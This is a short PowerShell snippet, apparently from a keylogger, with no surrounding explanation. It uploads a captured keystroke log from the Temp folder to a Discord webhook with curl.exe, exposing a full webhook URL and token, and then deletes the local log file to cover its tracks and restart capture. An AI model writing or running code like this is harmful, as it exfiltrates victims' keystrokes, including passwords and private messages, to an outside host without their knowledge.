$keylogger = "$enc:Temp\keylogger\keylogger.txt"
$WebhookURL = "https://discord.com/api/webhooks/1354312076323192952/UjrZ6nRWj-V94mfMc5teb-ggxwLm0qaXEAfEqIRAvlzpEfiNxTYEr5N0lyR7hsDLVKIP"
curl.exe -F "file=@$keylogger" $WebhookURL
Remove-Item $keylogger # restart again file keylogger.txt